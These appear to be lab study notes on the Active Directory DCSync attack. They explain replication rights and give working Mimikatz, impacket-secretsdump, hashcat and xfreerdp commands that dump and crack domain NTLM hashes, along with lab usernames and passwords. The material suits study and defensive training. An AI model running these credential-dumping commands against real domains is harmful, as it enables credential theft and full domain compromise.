- DRS (_Directory Replication Service_) Remote Protocol
    
    - Uses _replication_ to synchronize these redundant domain controllers
    - A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.
    - the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
- Need to have:
    
    - _Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set_ rights.
        
    - By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
        
    - _dcsync_ attack
        
        - If we obtain access to a user account in one of these groups or with these rights assigned where we can impersonate a domain controller

Example (w/ Mimikatz (Windows)):

- Set up:
    - RDP CLIENT75 as jeffadmin with the password BrouhahaTungPerorateBroom2023!.
    - jeffadmin is a member of the Domain Admins group
- Start:
    - `cd C:\Tools\`
    - `.\mimikatz.exe`
    - `lsadump::dcsync /user:corp\dave`
        - **lsadump::dcsync** -> module
        - **/user:** -> domain\user
        - output -> NTLM hash
- Crack the hash
    - `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
    - output -> Flowers1
- We can now obtain the NTLM hash of any domain user account of the domain **corp.com**
    - Get Admin hash
        - `lsadump::dcsync /user:corp\Administrator`
        - output -> Admin NTLM hash

Example (w/ _impacket-secretsdump_ (Linux)):

- Start:
    
    - `impacket-secretsdump -just-dc-user maria corp.com/mike:"Darkness1099\!"@192.168.200.70`
        - **-just-dc-user** -> tgt user
        - provide creds of user with rights
            - **domain/user:password@ip.**
        - uses _DRSUAPI_ the Microsoft API implementing the Directory Replication Service Remote Protocol.
- [Note]:  
    - Need a user that is a member of (Domain Admins, Enterprise Admins, or Administrators_- Needs_ Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set* rights.  
    └─$ xfreerdp /cert-ignore /u:mike /d:corp.com /p:Darkness1099! /v:192.168.200.75